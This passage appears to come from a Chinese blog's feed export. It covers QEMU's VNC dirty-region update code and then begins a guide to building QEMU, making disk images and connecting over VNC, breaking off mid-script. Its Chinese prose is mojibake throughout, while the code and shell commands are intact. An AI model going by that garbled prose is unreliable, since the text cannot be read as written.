class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_dpy_update</span><span class="hljs-params">(DisplayChangeListener *dcl,</span><br><span class="hljs-params">                           <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> *<span class="hljs-title">s</span> =</span> &amp;vd-&gt;guest;<br><br>    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆè¿™äº›è¢«æ ‡è®°ä¸º dirty çš„åŒºåŸŸä¼šåœ¨ <code>vnc_refresh()</code> ä¸­è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ—¶è¢«è¿›ä¸€æ­¥å¤„ç†ï¼Œåœ¨ <code>vnc_update_client()</code> ä¸­å˜ä¸ºæ–°çš„ VncJob é“¾åˆ°å…¨å±€é“¾è¡¨ä¸Š</p><h2 id="å››ã€vnc-client-update-åˆ›å»ºæ–°çš„-VncJob-æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š">å››ã€vnc_client_update - åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š</h2><p>å½“å‰é¢æˆ‘ä»¬å°†ç‰¹å®šçš„æ˜¾ç¤ºåŒºåŸŸæ ‡è®°ä¸º dirty ä¹‹åï¼Œæœ€ç»ˆä¼šç”± <code>vnc_update_client()</code> å‡½æ•°æ¥æ‰«æ dirty åŒºåŸŸï¼Œå¹¶åˆ›å»ºç›¸åº”çš„ VncJob æŒ‚è½½åˆ°å…¨å±€çš„ queue ä¸Šï¼Œå› æ­¤æœ€åå®é™…ä¸Šè¿˜æ˜¯ç”± vnc worker thread å®Œæˆæ¨é€çš„ä»»åŠ¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_update_client</span><span class="hljs-params">(VncState *vs, <span class="hljs-type">int</span> has_dirty)</span><br>&#123;<br>    VncDisplay *vd = vs-&gt;vd;<br>    VncJob *job;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> height, width;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (vs-&gt;disconnecting) &#123;<br>        vnc_disconnect_finish(vs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    vs-&gt;has_dirty += has_dirty;<br>    <span class="hljs-keyword">if</span> (!vnc_should_update(vs)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Send screen updates to the vnc client using the server</span><br><span class="hljs-comment">     * surface and server dirty map.  guest surface updates</span><br><span class="hljs-comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span><br><span class="hljs-comment">     * send them to the client.</span><br><span class="hljs-comment">     */</span><br>    job = vnc_job_new(vs);  <span class="hljs-comment">// åˆ›å»ºæ–°çš„ VncJob</span><br><br>    height = pixman_image_get_height(vd-&gt;server);<br>    width = pixman_image_get_width(vd-&gt;server);<br><br>    y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// æ‰«æ dirty åŒºåŸŸ</span><br>        <span class="hljs-type">int</span> x, h;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = find_next_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty,<br>                                             height * VNC_DIRTY_BPL(vs),<br>                                             y * VNC_DIRTY_BPL(vs));<br>        <span class="hljs-keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;<br>            <span class="hljs-comment">/* no more dirty bits */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        y = offset / VNC_DIRTY_BPL(vs);<br>        x = offset % VNC_DIRTY_BPL(vs);<br>        x2 = find_next_zero_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty[y],<br>                                VNC_DIRTY_BPL(vs), x);<br>        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);<br>        h = find_and_clear_dirty_height(vs, y, x, x2, height);<br>        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);<br>        <span class="hljs-keyword">if</span> (x2 &gt; x) &#123;<br>            <span class="hljs-comment">// åˆ›å»ºæ–°çš„ VncRectï¼ŒæŒ‚è½½åˆ° VncJob ä¸Š</span><br>            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,<br>                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;<br>            y += h;<br>            <span class="hljs-keyword">if</span> (y == height) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    vs-&gt;job_update = vs-&gt;update;<br>    vs-&gt;update = VNC_STATE_UPDATE_NONE;<br>    vnc_job_push(job);  <span class="hljs-comment">// æŒ‚è½½åˆ°å…¨å±€ queue ä¸Š</span><br>    vs-&gt;has_dirty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒQemu ä¸­ VNC çš„å·¥ä½œæµç¨‹åŸºæœ¬åˆ†æå®Œæ¯•</p><h1>0xFF.æ€»è§ˆ</h1><p>æœ€åè®©æˆ‘ä»¬é‡æ–°çœ‹ä¸€ä¸‹ Qemu VNC çš„åŸºæœ¬æ¶æ„ï¼Œè¿™é‡Œå†æ”¾ä¸€å¼ ä»<a href="https://zhuanlan.zhihu.com/p/69568087">çŸ¥ä¹</a>ä¸Šå·æ¥çš„ä¸€ä¸ª Qemu VNC çš„åŸºæœ¬æ¶æ„å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>åœ¨ Qemu ä¸­å†…éƒ¨çš„æ˜¾ç¤ºç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>æœ€ç»ˆçš„æ›´æ–°è°ƒç”¨é“¾è·¯åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vncï¼ŒğŸ•éƒ½ä¸ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x00ã€‘Qemu - Iï¼šQemu ç®€æ˜“é£Ÿç”¨æŒ‡å—</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2023-04-12T17:16:28.484Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¦‚ VMWareğŸ‘‹</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>Qemu æ˜¯ä¸€æ¬¾å¼€æºçš„è™šæ‹Ÿæœºè½¯ä»¶ï¼Œæ”¯æŒå¤šç§ä¸åŒæ¶æ„çš„æ¨¡æ‹Ÿï¼ˆEmulationï¼‰ä»¥åŠé…åˆ kvm å®Œæˆå½“å‰æ¶æ„çš„è™šæ‹ŸåŒ–ï¼ˆVirtualizationï¼‰çš„ç‰¹æ€§ï¼Œæ˜¯å½“å‰æœ€ç«çƒ­çš„å¼€æºè™šæ‹Ÿæœºè½¯ä»¶</p><p><img src="https://s2.loli.net/2022/07/22/jfIDUCx5ZtMsHAY.png" alt="image.png"></p><p>Qemu çš„åŸºæœ¬è¿è¡Œæ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/26/9L7HtFUQlyZdwXD.png" alt="image.png"></p><p>æœ¬ç¯‡æ–‡ç« ç¬”è€…å°†ç®€è¦å™è¿°å¦‚ä½•ä»æºç ç¼–è¯‘ç‰¹å®šæ¶æ„çš„ Qemu å¹¶è¿›è¡Œä¸€å®šç¨‹åº¦çš„æ”¹é€ å·¥ä½œ</p><h2 id="PRE-å®‰è£…ä¾èµ–">PRE.å®‰è£…ä¾èµ–</h2><p>å¤§æ¦‚éœ€è¦å®‰è£…è¿™äº›ä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt -y install ninja-build build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libpixman-1-dev libfdt-dev</span><br></code></pre></td></tr></table></figure><h1>0x01.ä»æºç ç¼–è¯‘ QEMU</h1><h2 id="ä¸€ã€è·å–-QEMU-æºç ">ä¸€ã€è·å– QEMU æºç </h2><p>å¤§æ¦‚æœ‰ä¸¤ç§é€”å¾„ï¼šä»å®˜ç½‘ä¸‹è½½æˆ–æ˜¯ç›´æ¥ä» Qemu çš„GitHub ä»“åº“æ‹‰ä¸‹æ¥ã€‚</p><h3 id="I-å®˜ç½‘ä¸‹è½½æºç ">I.å®˜ç½‘ä¸‹è½½æºç </h3><p>å‰å¾€ <a href="https://download.qemu.org">qemu çš„å®˜ç½‘</a>è¿›è¡Œä¸‹è½½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf qemu-7.0.0.tar.xz</span><br></code></pre></td></tr></table></figure><h3 id="II-GitHub-è·å–æºç ">II. GitHub è·å–æºç </h3><p>ç›´æ¥ä» <a href="https://github.com/qemu/qemu">GitHub</a> ä¸Šé¢æ‹‰ä¹Ÿè¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:qemu/qemu.git</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹">äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹</h2><p>æ¥ä¸‹æ¥åˆ›å»º build ç›®å½•å¹¶é…ç½®å¯¹åº”çš„ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build</span><br><span class="hljs-meta prompt_">build$ </span><span class="language-bash">../qemu-7.0.0/configure --enable-kvm --target-list=x86_64-softmmu --enable-debug</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†è¿™å‡ ä¸ªç¼–è¯‘é€‰é¡¹ï¼š</p><ul><li><code>--enable-kvm</code>ï¼šå¼€å¯ kvm æ”¯æŒ</li><li><code>--target-list=&lt;æ¶æ„å&gt;</code>ï¼šæŒ‡å®šè¦ç¼–è¯‘çš„ CPU æ¶æ„ï¼Œè¿™é‡Œæˆ‘ä»¬æŒ‡å®šä¸º <code>x86_64-softmmu</code> å³è¡¨ç¤ºæˆ‘ä»¬è¦ç¼–è¯‘ x86 æ¶æ„çš„ 64ä½ CPU</li><li><code>--enable-debug</code>ï¼šèƒ½å¤Ÿå¯¹ Qemu è¿›è¡Œè°ƒè¯•</li></ul><blockquote><p>å¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šçš„è¯ä¼šæŠŠæ‰€æœ‰æ¶æ„éƒ½ç¼–è¯‘ä¸€éï¼Œä¸è¿‡è¿™é‡Œç¬”è€…åªéœ€è¦ x86 çš„ï¼›ï¼‰</p></blockquote><h2 id="ä¸‰ã€å¼€å§‹ç¼–è¯‘">ä¸‰ã€å¼€å§‹ç¼–è¯‘</h2><p>ç›´æ¥ make å°±å®Œäº‹äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>éœ€è¦èŠ±çš„æ—¶é—´è¿˜æ˜¯ä¸çŸ­çš„ï¼Œåœ¨ç¬”è€…çš„å°ç ´æœåŠ¡å™¨ä¸Šç¼–è¯‘å¤§æ¦‚éœ€è¦åå‡ åˆ†é’Ÿå·¦å³ï¼Œå¤§æ¦‚ç¼–è¯‘äº†ä¸¤åƒå¤šä¸ªæ–‡ä»¶ï¼Œå®Œæˆä¹‹ååœ¨å½“å‰ç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªçƒ­ä¹ä¹çš„å¯æ‰§è¡Œæ–‡ä»¶ <code>qemu-system_x86-64</code>ï¼Œè¿™ä¸ªå°±æ˜¯ Qemu çš„æœ¬ä½“äº†</p><p>ä¹‹åå¯ä»¥ make install ç»™ä»–å®‰åˆ° bin é‡Œè¾¹ï¼Œè¿™æ ·å°±èƒ½ç›´æ¥ä»å‘½ä»¤è¡Œå¯åŠ¨äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><h1>0x02.æ„å»ºç³»ç»Ÿé•œåƒå¹¶ä½¿ç”¨ vnc è¿æ¥</h1><p>ç©ºæœ‰ä¸€ä¸ª <code>qemu</code> çš„å¯æ‰§è¡Œæ–‡ä»¶è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬æœ€ç»ˆè¿˜æ˜¯è¦åœ¨ qemu ä¸Šé¢è·‘ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿçš„ï¼Œé‚£ä¹ˆè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>ä½¿ç”¨ <code>qemu-img</code> åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶ï¼Œé€šè¿‡ <code>-cdrom</code> å‚æ•°æŒ‡å®šè½½å…¥ä¸€ä¸ª ISO é•œåƒæ–‡ä»¶æ¥å®‰è£…ä¸€ä¸ªç°æœ‰çš„æ“ä½œç³»ç»Ÿ</li><li>ä½¿ç”¨ <code>debootstrap</code> åˆ›å»º ext4 ç¡¬ç›˜é•œåƒï¼Œå¹¶ç›´æ¥è¿è¡Œä¸€ä¸ªç°æˆçš„è£¸çš„å†…æ ¸é•œåƒæ–‡ä»¶ï¼ˆbzImageï¼‰</li></ul><h2 id="ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡-CDROM-å®‰è£…-Ubuntu">ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡ CDROM å®‰è£… Ubuntu</h2><h3 id="I-ä½¿ç”¨-qemu-img-åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶">I.ä½¿ç”¨ <code>qemu-img</code> åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶</h3><p>è¿™ä¸€æ­¥æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯ç”¨ <code>build</code> ç›®å½•ä¸‹çš„ <code>qemu-img</code> æ¥å®Œæˆæ„å»ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./build/qemu-img create -f qcow2 test.qcow2 20G</span><br>Formatting &#x27;test.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=21474836480 lazy_refcounts=off refcount_bits=16<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>-f</code> å‚æ•°æŒ‡å®šçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºé•œåƒæ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨ QEMU æœ€é€šç”¨çš„æ ¼å¼ <code>qcow2</code>ï¼›ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºé•œåƒå¤§å°</p><blockquote><p>å‚è§<a href="https://docs.fedoraproject.org/zh-CN/Fedora/12/html/Virtualization_Guide/sect-Virtualization_Guide-Tips_and_tricks-Using_qemu_img.html">è¿™é‡Œ</a></p></blockquote><h3 id="II-é€šè¿‡-vnc-è¿æ¥å®Œæˆå®‰è£…">II.é€šè¿‡ vnc è¿æ¥å®Œæˆå®‰è£…</h3><p>åœ¨ qemu å¯åŠ¨æ—¶é€šè¿‡ <code>-cdrom</code> å‚æ•°å¯ä»¥æŒ‡å®šåŠ è½½çš„ISOæ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©å®‰è£…ä¸€ä¸ª Ubuntu 22.04ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso</span><br>VNC server running on ::1:5900<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>-m</code>ï¼šè™šæ‹Ÿæœºçš„å†…å­˜å¤§å°</li><li><code>-drive</code> ï¼šqemu å¯åŠ¨æ—¶é¢å¤–åŠ è½½çš„è®¾å¤‡ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>format=qcow2,file=test.qcow2</code> æŒ‡å®šäº†åŠ è½½è®¾å¤‡ <code>test.qcow2</code>ã€æ ¼å¼ä¸º <code>qcow2</code></li><li><code>-enable-kvm</code> ï¼šå¯ç”¨ kvm æ¨¡å¼ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥é€‰é¡¹<strong>è¦æ±‚ä»¥ root æƒé™è¿è¡Œ</strong></li><li><code>-cdrom</code>ï¼šæŒ‡å®š qemu å¯åŠ¨æ—¶è£…è½½çš„å…‰ç¢Ÿæ–‡ä»¶è·¯å¾„</li></ul><p>å¯åŠ¨å qemu é»˜è®¤ä¼šåœ¨ 5900 ç«¯å£å¯åŠ¨ä¸€ä¸ª VNC serverï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡ VNC è¿æ¥åˆ° qemu ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ<strong>åªèƒ½åœ¨æœ¬åœ°è¿›è¡Œè¿æ¥</strong></p><p>å¦‚æœæ˜¯è¿è¡Œåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„è¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¢å¤–æŒ‡å®š <code>-vnc</code> å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso -vnc yourip:0</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>vnc</code> å‚æ•°ä¸­ ip åé¢è·Ÿç€çš„ä¸æ˜¯ç«¯å£å·ï¼Œè€Œæ˜¯ <code>display numer</code>ï¼Œå¯¹äºé»˜è®¤çš„ <code>display 0</code> è€Œè¨€å…¶ç›‘å¬çš„ç«¯å£å·ä¸º <code>5900</code>ï¼Œè€Œ <code>display 1</code> å°±æ˜¯ <code>5901</code> ç«¯å£ï¼Œä»¥æ­¤ç±»æ¨</p><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½é€šè¿‡ vnc è¿æ¥ä¸Šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ qemu äº†ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <code>VNC Viewer</code> è¿›è¡Œè¿æ¥ï¼š</p><p><img src="https://s2.loli.net/2022/07/11/3juM5iAgFERhYsS.png" alt="image.png"></p><p>æˆåŠŸè¿æ¥ä¸Šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ qemuï¼š</p><p><img src="https://s2.loli.net/2022/07/11/UdlOA6DGaPFJqx2.png" alt="image.png"></p><p>ä¹‹åå°±æ˜¯å¸¸è§„çš„å®‰è£…æµç¨‹äº†ï¼Œä¸è¿‡å¯èƒ½æ˜¯ç”±äº qemu æ¨¡æ‹Ÿæ˜¾å¡çš„é—®é¢˜ï¼ˆæˆ–è€…æ˜¯ VNC é…ç½®çš„é—®é¢˜ï¼‰ï¼Œåœ¨ä¸€å¼€å§‹çš„æ—¶å€™å®‰è£…ç•Œé¢çš„é¢œè‰²ä¼šæœ‰ç‚¹å¤±çœŸï¼š</p><p><img src="https://s2.loli.net/2022/07/11/lsp4rnZqSdbcIGL.png" alt="image.png"></p><p>ä¸è¿‡åœ¨å®‰è£…å‡†å¤‡ç»“æŸçš„æ—¶å€™åˆæ¢å¤æ­£å¸¸çš„é¢œè‰²äº†ï¼Œç¬”è€…ç›®å‰æ¨æµ‹åº”è¯¥æ˜¯å’Œæ˜¾å¡é©±åŠ¨æœ‰å…³ï¼š</p><p><img src="https://s2.loli.net/2022/07/11/g5jCb8yzmQYsvMd.png" alt="image.png"></p><p>ä¹‹åå°±å’Œæ­£å¸¸ä½¿ç”¨è™šæ‹Ÿæœºæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«äº†ï¼Œä¸‹æ¬¡å†æ¬¡å¯åŠ¨å°±ä¸éœ€è¦æŒ‡å®š <code>-cdrom</code> å‚æ•°äº†</p><p><img src="https://s2.loli.net/2022/07/11/WZiEx6vqnYapdl7.png" alt="image.png"></p><h2 id="äºŒã€æ„å»º-ext4-ç£ç›˜é•œåƒå¹¶è¿è¡Œ-kernel-bzImage">äºŒã€æ„å»º ext4 ç£ç›˜é•œåƒå¹¶è¿è¡Œ kernel bzImage</h2><p>å¦‚æœä½ ä¸éœ€è¦ä¸€ä¸ªå®Œæ•´çš„å‘è¡Œç‰ˆ Linux ç³»ç»Ÿç¯å¢ƒï¼Œåªæ˜¯æƒ³è·‘ä¸€ä¸ªè£¸çš„ç®€æ˜“çš„å†…æ ¸ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼å®Œæˆï¼š</p><h3 id="I-æ„å»ºç£ç›˜é•œåƒ">I.æ„å»ºç£ç›˜é•œåƒ</h3><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>debootstrap</code> æ¥åˆ›å»ºext4ç¡¬ç›˜é•œåƒï¼Œç›´æ¥ä½¿ç”¨ç”± Google å›¢é˜Ÿä¸º syzkaller æ„å»ºç£ç›˜é•œåƒçš„è„šæ­¥å³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><p>å®Œæˆä¹‹ååœ¨å½“å‰ç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªçƒ­ä¹ä¹çš„ <code>stretch.img</code>ï¼Œè¿™ä¾¿æ˜¯ ext4 ç£ç›˜é•œåƒæ–‡ä»¶äº†</p><blockquote><p>wget çš„è¿™ä¸€æ­¥<strong>éœ€è¦ç¿»å¢™</strong>ï¼ˆ<code>raw.githubusercontent.com</code> åœ¨å›½å†…ä¼¼ä¹æ˜¯è¢«å¢™äº†ï¼Œæ€»ä¹‹ç¬”è€…è®°å¿†é‡Œä»æ²¡æˆåŠŸåœ¨ä¸ç¿»å¢™çš„æƒ…å†µä¸‹æˆåŠŸä¸Šå»è¿‡ï¼‰ï¼Œè‹¥å«Œéº»çƒ¦å¯ä»¥ç›´æ¥ copy <a href="/download/create-image.sh">ç¬”è€…å·²ç»ä¸‹å¥½çš„</a></p></blockquote><h3 id="II-è·å–-kernel-bzImage">II.è·å– kernel bzImage</h3><p>è¿™éƒ¨åˆ†å‚è§<a href="http://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x01-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%EF%BC%88bzImage%EF%BC%89">è¿™é‡Œ</a></p><h3 id="III-è¿è¡Œ-qemu-å¹¶é€šè¿‡-vnc-è¿›è¡Œè¿æ¥">III.è¿è¡Œ qemu å¹¶é€šè¿‡ vnc è¿›è¡Œè¿æ¥</h3><p>åˆ›å»ºå¦‚ä¸‹ bash è„šæœ¬å¹¶è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 